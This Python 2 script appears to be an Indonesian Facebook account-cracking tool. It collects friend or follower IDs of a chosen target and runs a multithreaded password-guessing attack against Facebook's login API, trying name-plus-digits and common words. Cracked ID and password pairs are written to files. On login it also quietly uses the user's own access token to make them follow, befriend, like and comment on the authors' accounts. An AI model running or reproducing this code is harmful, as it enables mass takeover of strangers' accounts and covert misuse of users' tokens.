#-*-coding:utf-8-*-

# Coded By Raka & Angga
# Recode Cuiiiihh ...
# Bacottt

import os,sys,time,random,hashlib,re,threading,json,urllib,cookielib,requests,uuid,datetime
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import date 
reload(sys) 
sys.setdefaultencoding('utf8')
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

def raka(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(00.01)

loop = 0
id = []
cp = []
ok = []


raka_sayang_amanda = '3882176535153442'
def __raka_sayang_amanda__():
	os.system('clear')
	raka(_raka_banner_);time.sleep(00.1)
	raka("\n\033[0;37m[\033[0;36m1\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Login Menggunakan Token Facebook")
	raka("\033[0;37m[\033[0;36m2\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Cara Mengambil Token Facebook")
	raka("\033[0;37m[\033[0;36m3\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Exit")
        masuk = raw_input("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Choose : \033[0;36m")
        if masuk == "":
                exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk Input")
        elif masuk == "1":
		token = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token  : \033[0;36m")
		try:
                	y = requests.get('https://graph.facebook.com/me?access_token='+token)
	                x = json.loads(y.text)
	                nama = x['name']
	                save = open("login.txt", 'w')
	                save.write(token)
	                save.close()
                        follow_my_raka()
                        jalan("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Login Succes...")
	        except KeyError:
			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token Expired")
	                time.sleep(3)
	                __raka_sayang_amanda__()
	        except requests.exceptions.SSLError:
	                exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token Expired")
        elif masuk == "2":
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Anda akan diarahkan ke youtube")
                time.sleep(3)
		os.system("xdg-open https://youtu.be/bszAm4C5ovE")
                exit()
        elif masuk == "0":
                exit()
        else:
		exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk input")
_raka_banner_ = ("""
\033[0;31m       $$$$$$$$\ $$\                             $$$$$$$\  
\033[0;31m      $$  _____|$$ |                            $$  __$$\ 
\033[0;32m     $$ |      $$ | $$$$$$\   $$$$$$\          $$ |  $$ |
\033[0;32m    $$$$$\    $$ |$$  __$$\  \____$$\ $$$$$$\ $$$$$$$  |
\033[0;33m   $$  __|   $$ |$$ /  $$ | $$$$$$$ |\______|$$  __$$< 
\033[0;33m  $$ |      $$ |$$ |  $$ |$$  __$$ |        $$ |  $$ |
\033[0;36m $$$$$$$$\ $$ |\$$$$$$$ |\$$$$$$$ |        $$ |  $$ |
\033[0;36m\________|\__| \____$$ | \_______|        \__|  \__|
\033[0;35m             $$\   $$ |                            
\033[0;35m            \$$$$$$  |                            
\033[0;35m            \______/                             
\033[0;36m_______________________________________________________\n
\033[0;32m⋆✥⋆➣\033[0;37mDesigen By : \033[0;36mRaka Andrian Tara
\033[0;32m⋆✥⋆➣\033[0;37mGithub     : \033[0;36mBajingan-Z
\033[0;32m⋆✥⋆➣\033[0;37mCoded By   : \033[0;36mRaka \033[0;37m& \033[0;36mAngga\033[0;37m
\033[0;36m_______________________________________________________        """)

def follow_my_raka():
    try:
        token = open('login_r.txt', 'r').read()
    except IOError:
        print(' Invalid Token ! ')
        jalan(' Please Login Again');time.sleep(1)
        os.system('rm -rf login_r.txt')
    kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
    kata_utama = ("Pengguna Script Premium")
    komen = kata_utama+"\n"+kata_kata_cinta
    kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
    kata_utama2 = random.choice(["Hai Aa @[100000834003593:]","Hello Aa @[100000834003593:]","Hello Aa @[100000834003593:]","Hai Aa @[100000834003593:]"])
    komen2 = kata_utama2+"\n"+kata_mutiara_islam
    pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Perang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
    kata_utama3 = ("MOGA LANGGENG AA @[100000834003593:] SAMA TTH @[100003016223315:] NYA AMIN")
    komen3 = kata_utama3+"\n"+pantun_motivasi
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+token)
    requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
    requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token)
    requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+token)
    requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token='+token)
    requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
    requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
    requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
    requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
    __menu__()

# Oi memex ini menu yah
def __menu__():
        try:
                token = open('login.txt','r').read()
        except IOError:
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token Expired")
                os.system('rm -rf login.txt')
		time.sleep(1)
                __raka_sayang_amanda__()
        try:
                p = requests.get('https://graph.facebook.com/me?access_token='+token)
                q = json.loads(p.text)
                name = q['name']
		birthday = q['birthday']
        except KeyError:
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token Expired")
                os.system('rm -rf login.txt')
		time.sleep(3)
		__raka_sayang_amanda__()
        except requests.exceptions.ConnectionError:
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Tidak ada koneksi internet");exit
        os.system('clear')
	raka(_raka_banner_);time.sleep(00.1)
	print("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama Account  : \033[0;36m" +name)
	print("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Tanggal Lahir : \033[0;36m"+birthday)
	raka("\n\033[0;37m[\033[0;36m1\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Crack Id Dari Publik")
	print("\033[0;37m[\033[0;36m2\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Crack Id Dari Followers")
	print("\033[0;37m[\033[0;36m3\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Chek Results Crack")
	raka("\033[0;37m[\033[0;36m0\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Remove Token")
	_naruto_kurama_ = raw_input("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Choose : \033[0;36m")
	if _naruto_kurama_ == "":
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk input ");exit
	elif _naruto_kurama_ == "1" or _naruto_kurama_ == "01":
		idt = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target : \033[0;36m")
		try:
			token=open('login.txt','r').read()
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama : \033[0;36m"+sp["name"])
		except KeyError:
			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target tidak ditemukan");exit
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			id.append(uid)
	elif _naruto_kurama_ == "2" or _naruto_kurama_ == "02":
		idt = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target : \033[0;36m")
		try:
			token=open('login.txt','r').read()
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama : \033[0;36m"+sp["name"])
		except KeyError:
			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target tidak di temukan");exit
		r = requests.get("https://graph.facebook.com/'+idt+'/subscribers?limit=5000&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			id.append(uid)
	elif _naruto_kurama_ == "3" or _naruto_kurama_ == "03":
		__hasil_ok_cp__()
	elif _naruto_kurama_ == "0" or _naruto_kurama_ == "00":
		os.system("rm -f login.txt")
		time.sleep(3)
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Terimakasih telah terhubung di tools saya");exit
	else:
		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk input");exit
	raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Total Id : \033[0;36m"+str(len(id)))
	raka("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Jika Tak Ada Hasil Mode Pesawat \033[0;36m1 \033[0;37mDetik ..?")
	print(' ')
	def main(arg):
		global ok,cp,ua, loop
		results = []
		__warna_warni__ = random.choice(['\033[0;33m','\033[0;36m','\033[0;90m','\033[0;35m','\033[0;31m','\033[0;00m'])
		print __warna_warni__+'\r[%s] %s/%s [Ok:%s] - [Cp:%s] ' % (datetime.now().strftime('%H:%M:%S'),loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		uid = arg
		try:
			d = requests.get('https://graph.facebook.com/'+uid+'/?access_token='+token)
	                v = json.loads(d.text)
			nama = v['name']
			first = v['first_name']
			last = v['last_name']
			results.append(nama)
			results.append(first+'123')
			results.append(first+'1234')
			results.append(first+'12345')
			results.append(first+'123456')
			results.append(last+'123')
			results.append(last+'1234')
			results.append(last+'12345')
			results.append(last+'123456')
			results.append('bismillah')
			results.append('sayang')
			results.append('anjing')
			results.append('indonesia')
			for pw in results:
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': 'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML,like Gecko) BrowserNG/7.1.17125',
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[1;92m[RAKA_AMANDA] '+uid+'|'+pw+'        '
					ok.append(uid+'|'+pw)
					save = open('Ok.json','a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					print '\r\033[1;96m[RAKA_AMANDA] '+uid+'|'+pw+'|'+nama
					cp.append(uid+'|'+pw)
					save = open('Cp.json','a')
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	raka("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Cracking Finised ");exit

if __name__=='__main__':
	os.system('git pull')
	__menu__()
